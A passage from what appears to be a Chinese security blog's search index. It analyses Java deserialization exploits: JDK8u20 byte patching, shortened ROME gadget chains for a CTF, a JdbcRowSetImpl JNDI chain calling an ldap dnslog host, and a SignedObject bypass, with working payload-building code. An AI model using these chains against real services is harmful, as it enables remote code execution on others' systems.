\u8fd0\u884c\u5230BeanContextSupport.deserialize()\u4e2d\u6b64\u65f6ois.readInt()\u65f6\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u53ef\u80fd\u662f\u4e2aTC_OBJECT\u6216\u8005TC_NULL\uff0c\u4e3a\u4e86\u8ba9\u653b\u51fb\u987a\u5229\uff0c\u5fc5\u987b\u8ba9ois.readInt()\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u662fTC_BLOCKDATA\u5305\u88f9\u7684\u6574\u578b\u53d8\u91cf0 // 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> // 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78 for(int i = 0; i < bytes.length; i++){ if(bytes[i] == 0x70 && bytes[i+1] == 0x77 && bytes[i+2] == 0x04 && bytes[i+3] == 0x00 && bytes[i + 4] == 0x00 && bytes[i+5] == 0x00 && bytes[i+6] == 0x00 && bytes[i+7] == 0x78){ System.out.println(\"[+] Change 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78\"); bytes[i] = 0x77; bytes[i+1] = 0x04; bytes[i+2] = 0x00; bytes[i+6] = 0x70; break; } } \u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u4fee\u6539\u5b57\u8282\u7801\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u8bd5\u8bd5\u6ce8\u91ca\u8fd9\u6bb5\u4ee3\u7801\u518d\u8fd0\u884c\uff0c\u53d1\u73b0\u4f1a\u51fa\u73b0\u62a5\u9519: at java.io.DataInputStream.readInt(DataInputStream.java:392) at java.io.ObjectInputStream$BlockDataInputStream.readInt(ObjectInputStream.java:2823) at java.io.ObjectInputStream.readInt(ObjectInputStream.java:972) at java.beans.beancontext.BeanContextSupport.deserialize(BeanContextSupport.java:931) at java.beans.beancontext.BeanContextSupport.readObject(BeanContextSupport.java:1084) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:483) at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017) at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371) at java.util.HashSet.readObject(HashSet.java:333) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:483) at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017) at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371) at jdk8u20EXP2.main(jdk8u20EXP2.java:128) Process finished with exit code 1 \u6211\u4eec\u8ddf\u8fdb BeanContextSupport#readObject \u770b\u770b\uff0c\u5176\u4ee3\u7801\u5982\u4e0b: private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable > 0 && this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } \u53ef\u4ee5\u770b\u5230\u5728 readChildren \u4e4b\u540e\u8fd8\u4f1a\u6267\u884c deserialize \u65b9\u6cd5\uff0c\u7ee7\u7eed\u8ddf\u8fdb: protected final void deserialize(ObjectInputStream ois, Collection coll) throws IOException, ClassNotFoundException { int count = 0; count = ois.readInt(); while (count-- > 0) { coll.add(ois.readObject()); } } \u4ed6\u8fd9\u91cc\u4f1a\u5c1d\u8bd5\u4ece\u53cd\u5e8f\u5217\u5316\u6d41\u4e2d\u8bfb\u53d6\u4e00\u4e2aInt\uff0c\u5982\u679cInt\u5927\u4e8e0\u7684\u8bdd\uff0c\u5c31\u4f1a\u7ee7\u7eed\u6267\u884c readObject \uff0c\u8fd9\u663e\u7136\u662f\u6211\u4eec\u4e0d\u60f3\u770b\u5230\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06\u5176\u6539\u4e3a0\uff0c\u90a3\u4e48exp3\u662f\u5982\u4f55\u4fee\u6539\u7684\u5462\uff1f TC_NULL - 0x70 // old TC_BLOCKDATA - 0x77 Length - 4 - 0x04 Contents - 0x00000000 TC_ENDBLOCKDATA - 0x78 TC_BLOCKDATA - 0x77 // new Length - 4 - 0x04 Contents - 0x00000000 TC_NULL - 0x70 TC_ENDBLOCKDATA - 0x78 \u6211\u4eec\u624b\u52a8\u4fee\u6539\u5b57\u8282\u7801\u7684\u539f\u56e0\u662f\u6211\u4eectry-catch\u5f02\u5e38\u4e4b\u540e\u5bfc\u81f4\u6b63\u5e38\u7684\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u90e8\u5206\u65ad\u5f00\uff0c\u540e\u7eed\u7684\u4e00\u90e8\u5206\u4ee3\u7801\u6ca1\u6709\u6b63\u5e38\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u624b\u52a8\u5c06\u540e\u7eed\u7684\u94fe\"\u63a5\u4e0a\"\uff0c\u5177\u4f53\u7684\u65b9\u6cd5\u5982\u4e0a\uff0c\u5c06\u8981\u88ab\u8bfb\u53d6\u7684Int\u4e0a\u79fb\uff0c\u5728java\u4e2d\u4e00\u4e2a\u5047\u5982\u6211\u4eec\u5e8f\u5217\u5316\u4e00\u4e2aInt: out.writeInt(120); \u5176\u4f1a\u5f97\u5230\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u8282\u7801: 77 04 00 00 00 78\uff1a\u8fd9\u6bb5\u4fe1\u606f\u63cf\u8ff0\u4e86\u6574\u6570120\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u301077\u3011 TC_BLOCKDATA\uff1a\u53ef\u9009\u7684\u6570\u636e\u5757\uff0c\u53c2\u8003\u540e\u8fb9\u7684\u7ae0\u8282\u5c31\u77e5\u9053\uff0c\u6240\u6709\u57fa\u7840\u7c7b\u578b\u6570\u636e\u7684\u5e8f\u5217\u5316\u90fd\u4f1a\u4f7f\u7528\u6570\u636e\u5757\u7684\u7ed3\u6784\uff1b \u301004\u3011 \u8be5\u503c\u8868\u793a\u5f53\u524d\u5199\u5165\u6570\u636e120\u503c\u5360\u7528\u7684\u5b57\u8282\u6570\uff0c\u56e0\u4e3a\u662fint\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6240\u4ee5\u8fd9\u4e2a120\u7684\u6570\u636e\u5e94\u8be5\u5360\u75284\u4e2a\u5b57\u8282\uff1b \u301000 00 00 78\u3011 \u8fd9\u6bb5\u6570\u636e\u8868\u793a120\u7684 \u503c \uff1b\u5341\u516d\u8fdb\u52360x78\u8f6c\u6362\u6210\u5341\u8fdb\u5236\u5c31\u662f120\uff1b \u800c0x70\u5373TC_NULL\u662f\u4e00\u4e2a\u7ec8\u6b62\u7b26\uff0c\u5176\u5177\u4f53\u610f\u4e49\u5982\u4e0b: TC_NULL\u4e00\u4e2a\u5b57\u8282\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8868\u793anull\u503c\uff0c\u4e00\u822c\u8fd9\u4e2a\u503c\u8868\u793a\u7684\u662f\u5bf9\u8c61\u7684\u7a7a\u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u8868\u793a\u9012\u5f52\u7ee7\u627f\u7ec8\u6b62\u7b26 \u6240\u4ee5exp3\u4e0a\u8ff0\u4e24\u4e2a\u624b\u52a8\u4fee\u6539\u5b57\u8282\u7801\u7684\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u5f25\u8865\u53cd\u5e8f\u5217\u5316\u5f02\u5e38\u7ec8\u6b62\u4e4b\u540e\u7684\u540e\u679c\uff0c\u4f7f\u5f97\u540e\u7eed\u53cd\u5e8f\u5217\u5316\u80fd\u591f\u6b63\u5e38\u8fd0\u884c\u3002","title":"\u56f0\u60d12"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u53c2\u8003\u6587\u7ae0","text":"https://paper.seebug.org/1232/ https://xz.aliyun.com/t/7240 https://xz.aliyun.com/t/8277 https://xz.aliyun.com/t/9566 https://xz.aliyun.com/t/9765 https://mp.weixin.qq.com/s/SMq6aE5-qV9cINv1-74RgA https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/ https://www.anquanke.com/post/id/87270 https://blog.csdn.net/silentbalanceyh/article/details/8183849","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bROME # \u5728\u67d0\u6b21\u6bd4\u8d5b\u4e2d\u9047\u5230\u4e00\u4e2ajava\u7684\u53cd\u5e8f\u5217\u5316\u9898\uff0c\u9898\u76ee\u5f88\u76f4\u63a5\u5730\u7ed9\u4e86\u4e00\u4e2ajar\u5305\uff0cpom.xml\u91cc\u5b58\u5728ROME1.0\u7684\u4f9d\u8d56\uff0c\u540c\u65f6\u8fd8\u6709\u4e00\u4e2a\u975e\u5e38\u660e\u663e\u7684\u8def\u7531: \u5bf9body base64\u89e3\u7801\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u9650\u5236\u662f\u8981\u6c42body\u7684\u957f\u5ea6\u8981\u5c0f\u4e8e1956\uff0c\u6240\u4ee5\u5c31\u6709\u4e86\u8fd9\u7bc7\u6587\u7ae0\u3002 ROME\u53cd\u5e8f\u5217\u5316\u94fe\u53ca\u5206\u6790 # \u6211\u4eec\u5148\u6765\u770b\u770b\u5927\u540d\u9f0e\u9f0e\u7684 ysoserial \u91cc\u7684ROME\u94fe\uff0c\u5176\u5229\u7528\u94fe\u5982\u4e0b: HashMap<K,V>.readObject(ObjectInputStream) HashMap<K,V>.hash(Object) == ObjectBean.hashCode() == EqualsBean.beanHashCode() ObjectBean.toString() == ToStringBean.toString() ToStringBean.toString(String) pReadMethod.invoke(_obj, NO_PARAMS) == TemplatesImpl.getOutputProperties() ... \u4e86\u89e3\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u94fe\uff0c\u4e3b\u8981\u662f\u5173\u6ce8\u5176\u7684source\uff0csink\u4ee5\u53ca\u5173\u952e\u8f6c\u6298\u70b9\uff0c\u8fd9\u6761\u94fe\u7684source\u662fHashMap\uff0csink\u662f TemplatesImpl.getOutputProperties() \u9020\u6210\u7684\u65b0\u7c7b\u521d\u59cb\u5316\u4ece\u800c\u6267\u884c\u65b0\u7c7bstatic\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u800c\u5173\u952e\u8f6c\u6298\u70b9\u4e3b\u8981\u662f pReadMethod.invoke(_obj,NO_PARAMS) \uff0c\u4e5f\u662fROME\u8fd9\u4e2a\u4f9d\u8d56\u6211\u4eec\u6700\u540e\u5229\u7528\u5230\u7684\u70b9\u3002 \u4f46\u662f\u5f88\u663e\u7136\u8fd9\u9053\u9898\u76ee\u6ca1\u529e\u6cd5\u76f4\u63a5\u7528\u8fd9\u6761\u94fe\u6253\u901a\uff0c\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e2a\u94febase64\u4e4b\u540e\u592a\u957f\u4e86\uff0c\u5355\u7eaf\u6267\u884c\u4e00\u4e2awhoami\u7684\u957f\u5ea6\u957f\u8fbe4380: \u4e3a\u4e86\u7f29\u51cfpayload\u957f\u5ea6\uff0c\u8fd9\u91cc\u53c2\u8003\u4e86\u4e00\u4e0b \u7ec8\u6781Java\u53cd\u5e8f\u5217\u5316Payload\u7f29\u5c0f\u6280\u672f \uff0c\u4f46\u6700\u7ec8\u53d1\u73b0\u4e86\u5982\u679c\u4e0d\u4fee\u6539\u94fe\u7684\u8bdd\u662f\u6ca1\u529e\u6cd5\u8fbe\u5230\u9898\u76ee\u8981\u6c42\u7684\u957f\u5ea6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u53bb\u6316\u6398\u4e00\u6761\u65b0\u94fe: \u65b0\u94fe1(\u7b26\u5408\u9898\u76ee\u8981\u6c42) # \u9996\u5148\u6211\u4eec\u8981\u4e86\u89e3\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4e0a\u6587\u7684payload\u5982\u6b64\u957f\uff0c\u5b9e\u9645\u4e0a\u6839\u636e\u8c03\u7528\u94fe\u6211\u4eec\u4e0d\u96be\u53d1\u73b0ObjectBean\u662f\u7f6a\u9b41\u7978\u9996\uff0c\u5176\u5728\u5b9e\u4f8b\u5316\u65f6\u4f1a\u5b9e\u4f8b\u5316\u4e09\u4e2abean\uff0c\u8fd9\u80fd\u4e0d\u5927\u5417: \u4f46\u662fObjectBean\u5b9e\u9645\u4e0a\u662f\u4e0a\u6587\u94fe\u7684\u6838\u5fc3\u5173\u952e: ObjectBean.hashCode() => ObjectBean._equalsBean.beanHashCode() => ObjectBean._toStringBean.toString() \u3002\u5982\u679c\u6211\u4eec\u60f3\u8981\u629b\u5f03ObjectBean\u7684\u8bdd\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u901a\u8fc7 HashMap \u89e6\u53d1 ToStringBean.toString() \u3002 \u4e0a\u9762\u6211\u4eec\u5206\u6790\u5230ROME\u94fe\u7684\u5173\u952e\u8f6c\u6298\u70b9\u662f pReadMethod.invoke(_obj,NO_PARAMS) \u8fd9\u6bb5\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7IDEA\u53bb\u641c\u7d22\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e0d\u6b62ToStringBean\u5b58\u5728\u8fd9\u4e2a\u5229\u7528\u70b9\uff0c\u5176\u4ed6Bean\u4e5f\u5b58\u5728: \u6839\u636e\u622a\u56fe\u6211\u4eec\u53ef\u4ee5\u770b\u5230 EqualsBean \u4e5f\u5b58\u5728\u8fd9\u4e2a\u5173\u952e\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u5f53\u8c03\u7528 EqualsBean.equals() \u65f6\u6700\u7ec8\u4f1a\u8c03\u7528\u5230 EqualsBean.beanEquals() \uff0c\u89e6\u53d1\u6211\u4eec\u7684\u5173\u952e\u4ee3\u7801: public boolean equals ( Object obj ) { return beanEquals ( obj ); } public boolean beanEquals ( Object obj ) { Object bean1 = _obj ; Object bean2 = obj ; boolean eq ; if ( bean2 == null ) { eq = false ; } else if ( bean1 == null && bean2 == null ) { eq = true ; } else if ( bean1 == null || bean2 == null ) { eq = false ; } else { if ( ! _beanClass . isInstance ( bean2 )) { eq = false ; } else { eq = true ; try { PropertyDescriptor [] pds = BeanIntrospector . getPropertyDescriptors ( _beanClass ); if ( pds != null ) { for ( int i = 0 ; eq && i < pds . length ; i ++ ) { Method pReadMethod = pds [ i ] . getReadMethod (); if ( pReadMethod != null && // ensure it has a getter method pReadMethod . getDeclaringClass () != Object . class && // filter Object.class getter methods pReadMethod . getParameterTypes (). length == 0 ) { // filter getter methods that take parameters Object value1 = pReadMethod . invoke ( bean1 , NO_PARAMS ); Object value2 = pReadMethod . invoke ( bean2 , NO_PARAMS ); eq = doEquals ( value1 , value2 ); } } } } catch ( Exception ex ) { throw new RuntimeException ( \"Could not execute equals()\" , ex ); } } } return eq ; } \u5982\u679c\u6211\u4eec\u6709\u8fc7\u8c03\u8bd5\u548c\u6784\u9020CC7\u94fe\u7684\u7ecf\u9a8c\u7684\u8bdd\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u60f3\u5230\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Hashtable\u6765\u4f5c\u4e3asource\uff0c\u89e6\u53d1equals\u65b9\u6cd5: \u63a5\u4e0b\u6765\u5c31\u662f\u6839\u636eCC7\u548cROME\u94fe\u8fdb\u884c\u6539\u9020\uff0c\u6700\u7ec8\u5f97\u5230\u5982\u4e0b\u7684payload(\u6269\u5c55\u4e8e EmYiQing/ShortPayload ): package org.sec.payload ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.syndication.feed.impl.EqualsBean ; import javax.xml.transform.Templates ; import java.util.HashMap ; import java.util.Hashtable ; public class ROME extends Payload { @SuppressWarnings ( \"all\" ) public static byte [] getPayloadUseByteCodes ( byte [] byteCodes ) { try { TemplatesImpl templates = new TemplatesImpl (); setFieldValue ( templates , \"_bytecodes\" , new byte [][] { byteCodes }); setFieldValue ( templates , \"_name\" , \"t\" ); EqualsBean bean = new EqualsBean ( String . class , \"s\" ); HashMap map1 = new HashMap (); HashMap map2 = new HashMap (); map1 . put ( \"yy\" , bean ); map1 . put ( \"zZ\" , templates ); map2 . put ( \"zZ\" , bean ); map2 . put ( \"yy\" , templates ); Hashtable table = new Hashtable (); table . put ( map1 , \"1\" ); table . put ( map2 , \"2\" ); setFieldValue ( bean , \"_beanClass\" , Templates . class ); setFieldValue ( bean , \"_obj\" , templates ); return serialize ( table ); } catch ( Exception e ) { e . printStackTrace (); } return new byte [] {}; } } \u8ba9\u6211\u4eec\u6765\u5b9e\u9645\u6d4b\u8bd5\u4e00\u4e0b\u957f\u5ea6: \u6700\u7ec8base64\u4e4b\u540e\u7684payload\u957f\u5ea6\u53ea\u67091452\uff0c\u5b8c\u7f8e\u7b26\u5408\u6211\u4eec\u7684\u9884\u671f: \u5229\u7528\u94fe # Hashtable.readObject() Hashtable.reconstitutionPut() EqualsBean.equals(TemplatesImpl) EqualsBean.beanEquals(TemplatesImpl) pReadMethod.invoke(_obj, NO_PARAMS) == TemplatesImpl.getOutputProperties() ... \u65b0\u94fe2(\u4e0d\u7b26\u5408\u9898\u76ee\u8981\u6c42) # \u5b9e\u9645\u4e0a\u6211\u4eec\u77e5\u9053 pReadMethod.invoke(_obj,NO_PARAMS) \u6700\u7ec8\u4f1a\u8c03\u7528\u5230_obj\u7684\u6240\u6709getter\u65b9\u6cd5\uff0c\u6839\u636e\u6211\u4eec\u5bf9\u53cd\u5e8f\u5217\u5316\u94fe\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528 JdbcRowSetImpl.getDatabaseMetaData() \u65b9\u6cd5\u6700\u7ec8\u89e6\u53d1JNDI\u6ce8\u5165\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06sink\u4fee\u6539\u4e00\u4e0b\u5373\u53ef: package top.longlone ; import com.sun.rowset.JdbcRowSetImpl ; import com.sun.syndication.feed.impl.EqualsBean ; import sun.misc.BASE64Encoder ; import java.io.ByteArrayOutputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Hashtable ; public class ROME { public static void setFieldValue ( Object object , String fieldName , Object value ) { try { Field field = object . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( object , value ); } catch ( Exception e ) { e . printStackTrace (); } } public static void main ( String [] args ) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl (); jdbcRowSet . setDataSourceName ( \"ldap://exmaple.dnslog.cn/a\" ); jdbcRowSet . setMatchColumn ( new String [] { \"a\" }); EqualsBean bean = new EqualsBean ( String . class , \"s\" ); HashMap map1 = new HashMap (); HashMap map2 = new HashMap (); map1 . put ( \"yy\" , bean ); map1 . put ( \"zZ\" , jdbcRowSet ); map2 . put ( \"zZ\" , bean ); map2 . put ( \"yy\" , jdbcRowSet ); Hashtable table = new Hashtable (); table . put ( map1 , \"1\" ); table . put ( map2 , \"2\" ); setFieldValue ( bean , \"_beanClass\" , JdbcRowSetImpl . class ); setFieldValue ( bean , \"_obj\" , jdbcRowSet ); ByteArrayOutputStream baos = new ByteArrayOutputStream (); ObjectOutputStream objectOutputStream = new ObjectOutputStream ( baos ); objectOutputStream . writeObject ( table ); String b64data = new BASE64Encoder (). encode ( baos . toByteArray ()); System . out . println ( b64data . length ()); // \u53cd\u5e8f\u5217\u5316 // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray())); // ois.readObject(); } } \u4f46\u662f\u5f53\u6211\u4eec\u8fd0\u884c\u7a0b\u5e8f\u65f6\u5f88\u9057\u61be\u5730\u53d1\u73b0\u957f\u5ea6\u8fd8\u662f\u8d85\u51fa\u4e861956: \u65b0\u94fe2\u957f\u5ea6\u5f88\u5927\u7684\u539f\u56e0\u662f\u56e0\u4e3a JdbcRowSetImpl \u8fd9\u4e2a\u7c7b\u7684\u5bf9\u8c61\u592a\u5927\u4e86\uff0c\u65b9\u6cd5\u5de8\u591a\uff0c\u672c\u6765\u4f18\u5316\u7684\u601d\u8def\u662f\u7528ASM\u628a\u6ca1\u7528\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5168\u90e8\u626c\u4e86\uff0c\u4f46\u662f\u8fd9\u4e2a\u7c7b\u7684\u7c7b\u52a0\u8f7d\u5668\u662f BootStrap \uff0c\u4f4d\u4e8e\u53cc\u4eb2\u59d4\u6d3e\u7684\u6700\u9876\u5c42\uff0c\u6240\u4ee5\u4fee\u6539\u8fc7\u540e\u7684\u5b57\u8282\u7801\u6ca1\u529e\u6cd5\u518d\u6b21\u52a0\u8f7d\u3002 \u53e6\u4e00\u4e2a\u4f18\u5316\u601d\u8def\u662f\u628a\u6ca1\u7528\u7684\u5c5e\u6027\u5168\u90e8\u6539\u4e3anull\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u4e0d\u80fd\u5f71\u54cdsink\u7684\u6700\u7ec8\u6267\u884c\u7ed3\u679c\uff0c\u6240\u4ee5\u8fd9\u91cc\u8981\u5bf9\u7167 pds[] \u4e2d getter \u65b9\u6cd5\u7684\u987a\u5e8f\u9009\u62e9\u5bf9\u5e94\u7684\u5c5e\u6027\u8fdb\u884c\u4fee\u6539\uff1a public class ROME_JNDI { public static void main ( String [] args ) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl (); jdbcRowSet . setDataSourceName ( \"ldap://1tqzc9.dnslog.cn/\" ); jdbcRowSet . setMatchColumn ( \"a\" ); clear ( jdbcRowSet ); EqualsBean equalsBean = new EqualsBean ( String . class , \"\" ); HashMap < String , Object > innerMap1 = new HashMap <> (); innerMap1 . put ( \"zZ\" , equalsBean ); innerMap1 . put ( \"yy\" , jdbcRowSet ); HashMap < String , Object > innerMap2 = new HashMap <> (); innerMap2 . put ( \"zZ\" , jdbcRowSet ); innerMap2 . put ( \"yy\" , equalsBean ); Hashtable table = new Hashtable (); table . put ( innerMap1 , 1 ); table . put ( innerMap2 , 1 ); Utils . setFieldValue ( equalsBean , \"_beanClass\" , JdbcRowSetImpl . class ); Utils . setFieldValue ( equalsBean , \"_obj\" , jdbcRowSet ); System . out . println ( new BASE64Encoder (). encode ( Utils . serialize ( table )). length ()); Utils . unserialize ( Utils . serialize ( table )); } static void clear ( JdbcRowSetImpl jdbcRowSet ) throws Exception { Utils . setFieldValue ( jdbcRowSet , \"iMatchColumns\" , null ); Utils . setFieldValue ( jdbcRowSet , \"resBundle\" , null ); Class <?> clazz = Class . forName ( BaseRowSet . class . getName ()); Field fee = clazz . getDeclaredField ( \"listeners\" ); fee . setAccessible ( true ); fee . set ( jdbcRowSet , null ); fee = clazz . getDeclaredField ( \"params\" ); fee . setAccessible ( true ); fee . set ( jdbcRowSet , null ); } } \u6700\u540e\u957f\u5ea6\u4e3a\uff1a \u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u65b9\u5f0f # \u6709\u65f6\u5019\u6211\u4eec\u4f1a\u9047\u5230\u4e00\u4e9b\u5176\u4ed6\u7684\u53cd\u5e8f\u5217\u5316\u65b9\u5f0f\uff0c\u4f8b\u5982Hessian(2)\uff0c\u5982\u679c\u4f7f\u7528\u8fd9\u79cd\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u8bdd\uff0c\u6211\u4eec\u7684\u94fe\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u539f\u56e0\u662f\u6211\u4eec\u7684Sink\u4e0d\u80fd\u518d\u4f7f\u7528TemplatesImpl\u7c7b\uff0c\u539f\u56e0\u662f: \u8fd9\u79cd\u53cd\u5e8f\u5217\u5316\u4e0d\u4f1a\u89e6\u53d1 TemplatesImpl.readObject() \u65b9\u6cd5\uff0c\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u51fa\u6765\u7684 TemplatesImpl._tfactory \u5c5e\u6027\u4e3a\u7a7a(\u8fd9\u4e2a\u5c5e\u6027\u5b58\u5728transient\u5173\u952e\u5b57\u4fee\u9970\uff0c\u65e0\u6cd5\u5e8f\u5217\u5316)\uff0c\u8fd9\u6837\u5bfc\u81f4\u6211\u4eec\u6700\u540e\u6ca1\u529e\u6cd5\u5229\u7528 TemplatesImpl#defineTransletClasses \u65b9\u6cd5\u53bb\u5b9e\u73b0\u4efb\u610fjava\u4ee3\u7801\u6267\u884c\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b9e\u9645\u4e0a\u6211\u4eec\u5c31\u53ea\u5269\u4e0bJNDI\u8fd9\u4e00\u6761\u8def\uff0c\u4f46\u52a0\u5165\u76ee\u6807\u4e0d\u51fa\u7f51/JDK\u7248\u672c\u8fc7\u9ad8\u7684\u8bdd\uff0cJNDI\u662f\u4e0d\u597d\u7528\u7684\uff0c\u8fd8\u6709\u5176\u4ed6\u65b9\u6cd5\u5417\uff1f \u7b54\u6848\u662f\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\uff0c\u6211\u4eec\u77e5\u9053EqualsBean/ToStringBean\u8fd9\u51e0\u4e2a\u7c7b\u6700\u7ec8\u4f1a\u89e6\u53d1\u67d0\u4e2a\u7c7b\u7684\u6240\u6709getter\uff0c\u90a3\u4e48\u5047\u5982\u5b58\u5728\u4e00\u4e2a\u7c7b\u5176getter\u65b9\u6cd5\u53c8\u4f1a\u4f7f\u7528java\u539f\u751f\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u4e14\u5176\u53cd\u5e8f\u5217\u5316\u5185\u5bb9\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u7ed5\u8fc7\u4e86\uff0c\u8fd9\u4e2a\u7c7b\u6b63\u662f java.security.SignedObject : \u90a3\u4e48\u6211\u4eec\u53bb\u627e\u4e0b\u8fd9\u4e2a\u7c7b\u7684\u7528\u6cd5\uff0c\u5176\u6784\u9020\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f1a\u88ab\u5e8f\u5217\u5316\u7136\u540e\u5b58\u653e\u5230 SignedObject.content \u4e2d: KeyPairGenerator kpg = KeyPairGenerator . getInstance ( \"DSA\" ); kpg . initialize ( 1024 ); KeyPair kp = kpg . generateKeyPair (); SignedObject signedObject = new SignedObject ( \"secret\" , kp . getPrivate (), Signature . getInstance ( \"DSA\" )); \u901a\u8fc7\u4f7f\u7528\u8fd9\u4e2a\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u6700\u7ec8\u6784\u9020\u51fa\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u7684payload: public class ROMETools { public static Hashtable getPayload ( Class clazz , Object payloadObj ) { EqualsBean bean = new EqualsBean ( String . class , \"s\" ); HashMap map1 = new HashMap (); HashMap map2 = new HashMap (); map1 . put ( \"yy\" , bean ); map1 . put ( \"zZ\" , payloadObj ); map2 . put ( \"zZ\" , bean ); map2 . put ( \"yy\" , payloadObj ); Hashtable table = new Hashtable (); table . put ( map1 , \"1\" ); table . put ( map2 , \"2\" ); Utils . setFieldValue ( bean , \"beanClass\" , clazz ); Utils . setFieldValue ( bean , \"obj\" , payloadObj ); return table ; } public static void main ( String [] args ) throws Exception { TemplatesImpl templates = new TemplatesImpl (); ClassPool pool = ClassPool . getDefault (); CtClass clazz = pool . getCtClass ( \"top.longlone.A\" ); byte [] bytes = clazz . toBytecode (); Utils . setFieldValue ( templates , \"_bytecodes\" , new byte [][] { bytes }); Utils . setFieldValue ( templates , \"_name\" , \"A\" ); Hashtable table1 = getPayload ( Templates . class , templates ); KeyPairGenerator kpg = KeyPairGenerator . getInstance ( \"DSA\" ); kpg . initialize ( 1024 ); KeyPair kp = kpg . generateKeyPair (); SignedObject signedObject = new SignedObject ( table1 , kp . getPrivate (), Signature . getInstance ( \"DSA\" )); Hashtable table2 = getPayload ( SignedObject . class , signedObject 